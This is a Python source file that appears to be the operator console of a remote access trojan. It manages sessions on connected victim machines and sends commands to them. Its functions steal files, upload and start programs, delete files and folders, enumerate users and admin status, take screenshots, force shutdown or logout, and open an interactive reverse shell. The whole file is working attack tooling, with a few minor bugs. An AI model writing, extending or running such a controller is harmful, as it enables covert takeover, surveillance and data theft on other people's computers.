import os
import time
import pickle
import traceback
import socket as sock
from .var import globals as g
from .help import help_menu
from sources.functions.ClearScreen import clear_screen


def handler(signum, frame):
    global run
    run = False


def send_file(client, path_dir=''):
    data = client.recv(5120)
    if data == b'send':
        with open(path_dir, 'rb') as file:
            data = file.read()
            client.sendall(data)
            file.close()
        time.sleep(1)
        client.send(b'<END>')
    elif data[:6] == b'Failed':
        print(data.decode())
        print()


def recv_file(client, name=''):
    with open(name, 'wb') as file:
        done = False
        file_bytes = b''
        msg = b"Specified file doesn't exist"
        client.send(b'send')
        while not done:
            data = client.recv(1024)
            if data == b'<END>':
                done = True
            elif data[:6] == b'Failed':
                print(data.decode())
                print()
                done = True
            elif data == msg:
                print(msg.decode())
                return False
            else:
                file_bytes += data
        file.write(file_bytes)
        file.close()
    return True


def get_cwd(client):
    cwd = (client.recv(10240)).decode()
    if cwd[:6] == b'Failed':
        print(cwd.decode())
        print()
        return
    print(f"Current working directory : '{cwd}'")
    print()


def list_cwd(client):
    data = client.recv(10240)
    if data[:6] == b'Failed':
        print(data.decode())
        print()
        return
    files = pickle.loads(data)
    print("Current Working Directory :  \n")
    for fil in files:
        print(fil)
    print()


def list_dir(client):
    path = input("Enter directory : ")
    print()
    client.send(path.encode())
    data = client.recv(10240)
    if data == f"'{path}' doesn't exist".encode():
        print(data.decode())
        print()
        return
    elif data[:6] == b'Failed':
        print(data.decode())
        print()
        return
    files = pickle.loads(data)
    print(f"Directory : '{path}' \n")
    for fil in files:
        print(fil)
    print()


def download(client):
    path_dir = input("Enter file path : ")
    print()
    client.send(path_dir.encode())
    name = input("Enter name (directory) for file to be saved : ")
    if recv_file(client=client, name=name):
        print(f"\n\n{path_dir} saved as {name}\n\n")
    else:
        os.remove(name)


def upload(client):
    name = input("Enter file path (with name) : ")
    print()
    if os.path.exists(name):
        path_dir = input("Enter directory/name to be saved in : ")
        client.send(path_dir.encode())
        send_file(client=client, path_dir=name)
        msg = (client.recv(5120)).decode()
        print()
        print(msg)
        print()
    else:
        print()
        print("Specified file not found")
        print()


def change_dir(client):
    dir_path = input("Enter directory : ")
    client.send(dir_path.encode())
    msg = (client.recv(5120)).decode()
    print()
    print(msg)
    print()


def remove(client):
    path_dir = input("Enter file path : ")
    client.send(path_dir.encode())
    msg = (client.recv(5120)).decode()
    print()
    print(msg)
    print()


def remove_dir(client):
    dir_path = input("Enter Directory : ")
    client.send(dir_path.encode())
    msg = (client.recv(5120)).decode()
    print()
    print(msg)
    print()


def open_url(client):
    url = input("Enter URL : ")
    client.send(url.encode())
    msg = (client.recv(5120)).decode()
    print()
    print(msg)
    print()


def start_process(client, Id):
    if 'Linux' in g.active_conns[Id][2]:
        print("Client is running linux")
        print("Only bash(.sh) files are supported\n")
        path_dir = input("Enter file directory : ")
        if os.path.splitext(path) != '.sh':
            print("Specified file is not a bash(.sh) file")
            return
    else:
        path_dir = input("Enter file directory : ")
    client.send(path_dir.encode())
    msg = (client.recv(5120)).decode()
    print()
    print(msg)
    print()


def current_user(client):
    username = (client.recv(5120)).decode()
    print()
    print(username)
    print()


def check_admin(client):
    status = client.recv(5120).decode()
    print()
    print(status)
    print()


def list_users(client):
    users = client.recv(10240).decode()
    print()
    print(users)
    print()


def current_user_details(client):
    details = client.recv(5120).decode()
    print()
    print(details)
    print()


def user_details(client):
    user = input("Enter username of the user : ")
    print()
    client.send(user.encode())
    details = client.recv(5120).decode()
    print()
    print(details)
    print()


def take_screenshot(client):
    name = f"screenshot-{input('Enter name to be saved (without extension) : ')}.png"
    while True:
        path = input("Enter path to be saved in : ")
        print()
        if path == '':
            path = os.getcwd()
            path = os.path.join(path, name)
            recv_file(client=client, name=path)
            break
        elif os.path.exists(path):
            path = os.path.join(path, name)
            recv_file(client=client, name=path)
            break
        else:
            print("Specified path not found")
            print()
    print()
    print(f"Screenshot saved as {path}")
    print()


def get_shell(client, Id):
    print("\nPress Ctrl-c or enter 'exit'/'quit' to exit reverse shell\n")
    cwd = (client.recv(5120)).decode()
    print(f"Reverse shell attained on session [{Id}]\n")
    print(cwd, end='')
    while not g.till:
        try:
            command = input()
            if Id not in g.active_conns:
                print()
                print("Session [{Id}] : Session died")
                print("Client closed connection")
                print()
                break
            if command in ['exit', 'quit']:
                break
            elif command == 'clear':
                client.send(b'null')
                output = (client.recv(5120)).decode()
                clear_screen()
                print(output, end='')
            elif len(command) == 0:
                client.send(b'null')
                output = (client.recv(5120)).decode()
                print(output, end='')
            else:
                client.send(command.encode())
                output = (client.recv(10240)).decode()
                print(output, end='')
        except KeyboardInterrupt:
            break
        except EOFError:
            break
        except sock.timeout:
            print()
            print("Session may have died...Returning to shell")
            print()
            break
        except Exception:
            print()
            print(traceback.format_exc())
            print()
            print("Session may have died...Returning to shell")
            print()
            break
    client.send(b'exit shell')
    print()


def shutdown(client):
    msg = (client.recv(5120)).decode()
    print()
    print(msg)
    print()


def restart(client):
    msg = (client.recv(5120)).decode()
    print()
    print(msg)
    print()


def logout(client):
    msg = (client.recv(5120)).decode()
    print()
    print(msg)
    print()


def send_command(client, Id, ip):
    print("Press Ctrl-c or enter 'exit'/'quit' to exit session\n\n")
    while not g.till:
        try:
            command = input(f"{g.bl}┌[{g.y}Session{g.c}#{g.r}<{g.p}{Id}{g.r}>{g.e}~{g.c}${g.bl}][{g.b}{g.r}@{g.g}{ip}{g.bl}]\n└───↠{g.y}>>> {g.e}")
            print()
            client.send(b'is_alive')
            if client.recv(5120) != b'alive' or Id not in g.active_conns:
                print()
                print(f"Session [{Id}] : Session died")
                print("Client closed connection")
                print()
                break
            if command == 'help':
                help_menu(command='help', parent='session')
                print()
            elif '--help' in command or '-h' in command:
                help_menu(command=command, parent='session')
                print()
            elif command == 'clear':
                clear_screen()
            elif command == 'cwd':
                client.send(command.encode())
                get_cwd(client=client)
            elif command == 'ls_cwd':
                client.send(command.encode())
                list_cwd(client=client)
            elif command == 'ls_dir':
                client.send(command.encode())
                list_dir(client=client)
            elif command == 'dwnld':
                client.send(command.encode())
                download(client=client)
            elif command == 'upld':
                client.send(command.encode())
                upload(client=client)
            elif command == 'chdir':
                client.send(command.encode())
                change_dir(client=client)
            elif command == 'rmv':
                client.send(command.encode())
                remove(client=client)
            elif command == 'rmv_dir':
                client.send(command.encode())
                remove_dir(client=client)
            elif command == 'opn_url':
                client.send(command.encode())
                open_url(client=client)
            elif command == 'strt_proc':
                client.send(command.encode())
                start_process(client=client, Id=Id)
            elif command == 'curr_usr':
                client.send(command.encode())
                current_user(client=client)
            elif command == 'chk_admin':
                client.send(command.encode())
                check_admin(client=client)
            elif command == 'list_usrs':
                client.send(command.encode())
                list_users(client=client)
            elif command == 'curr_usr_details':
                client.send(command.encode())
                current_user_details(client=client)
            elif command == 'usr_details':
                client.send(command.encode())
                user_details(client=client)
            elif command == 'take_ss':
                client.send(command.encode())
                take_screenshot(client=client)
            elif command == 'getshell':
                client.send(command.encode())
                get_shell(client=client, Id=Id)
            elif command == 'shut':
                client.send(command.encode())
                shutdown(client=client)
            elif command == 'restrt':
                client.send(command.encode())
                restart(client=client)
            elif command == 'logout':
                client.send(command.encode())
                logout(client=client)
            elif command in ['exit', 'quit']:
                client.send(b'exit')
                return
            else:
                help_menu(command='invalid', parent='session')
                print()
        except KeyboardInterrupt:
            break
        except EOFError:
            break
        except sock.timeout:
            print()
            print(f"[{g.r}Error{g.e}] Session may have died...Returning to shell.")
            break
        except sock.error:
            print()
            print(f"[{g.r}Error{g.e}] Connections was forcibly closed by the target.")
            break
        except Exception as error:
            print()
            print(traceback.format_exc())
            print()
            print(error)
            print()
            send_command(client=client, Id=Id, ip=ip)
    return
